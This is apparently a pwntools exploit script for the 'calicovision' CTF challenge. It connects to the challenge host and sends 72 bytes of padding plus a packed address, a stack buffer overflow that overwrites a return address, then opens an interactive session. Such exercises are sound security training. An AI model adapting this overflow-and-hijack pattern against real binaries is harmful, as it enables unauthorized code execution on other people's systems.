#!/usr/bin/env python3

from pwn import *

gdbscript = '''
continue
'''
pwn = './calicovision'
host = 'calicovision.wpi-ctf-2022-codelab.kctf.cloud'
port = 1337

def start():
	if args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	elif args.REMOTE:
		return remote(host,port)
	else:
		return process(pwn)

elf = context.binary = ELF(pwn)
io = start()

io.recvuntil(b'>>> ')
io.sendline(b'B')
cat = io.recvline().split()[2].strip().decode()[1:]
info(f'Numer kota: {cat}')
io.sendlineafter(b'Enter a name: ',b'A'*72 + p64(0x005b0068))
io.interactive()
